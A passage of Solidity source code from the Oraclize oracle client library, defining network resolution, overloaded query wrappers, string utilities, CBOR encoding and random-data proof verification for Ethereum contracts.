encodeIndefiniteLengthType(buf, MAJOR_TYPE_CONTENT_FREE);\n }\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Android = 0x20;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal pure returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal pure returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal pure returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal pure returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal pure returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n using CBOR for Buffer.buffer;\n function stra2cbor(string[] arr) internal pure returns (bytes) {\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeString(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n function ba2cbor(bytes[] arr) internal pure returns (bytes) {\n Buffer.buffer memory buf;\n Buffer.init(buf, 1024);\n buf.startArray();\n for (uint i = 0; i < arr.length; i++) {\n buf.encodeBytes(arr[i]);\n }\n buf.endSequence();\n return buf.buf;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal view returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n require((_nbytes > 0) && (_nbytes <= 32));\n _delay *= 10;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes memory delay = new bytes(32);\n assembly {\n mstore(add(delay, 0x20), _delay)\n }\n bytes memory delay_bytes8 = new bytes(8);\n copyBytes(delay, 24, 8, delay_bytes8, 0);\n bytes[4] memory args = [unonce, nbytes, sessionKeyHash, delay];\n bytes32 queryId = oraclize_query(\"random\", args, _customGasLimit);\n bytes memory delay_bytes8_left = new bytes(8);\n assembly {\n let x := mload(add(delay_bytes8, 0x20))\n mstore8(add(delay_bytes8_left, 0x27), div(x, 0x100000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x26), div(x, 0x1000000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x25), div(x, 0x10000000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x24), div(x, 0x100000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x23), div(x, 0x1000000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x22), div(x, 0x10000000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x21), div(x, 0x100000000000000000000000000000000000000000000000000))\n mstore8(add(delay_bytes8_left, 0x20), div(x, 0x1000000000000000000000000000000000000000000000000))\n }\n oraclize_randomDS_setCommitment(queryId, keccak256(delay_bytes8_left, args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(keccak256(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(keccak256(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = byte(1);\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n require((_proof[0] == \"L\") && (_proof[1] == \"P\") && (_proof[2] == 1));\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n require(proofVerified);\n _;\n }\n function oraclize_randomDS_proofVerify__returnCode(bytes32 _queryId, string _result, bytes _proof) internal returns (uint8){\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) return 1;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) return 2;\n return 0;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix, uint n_random_bytes) internal pure returns (bool){\n bool match_ = true;\n require(prefix.length == n_random_bytes);\n for (uint256 i=0; i< n_random_bytes; i++) {\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n if (!(keccak256(keyhash) == 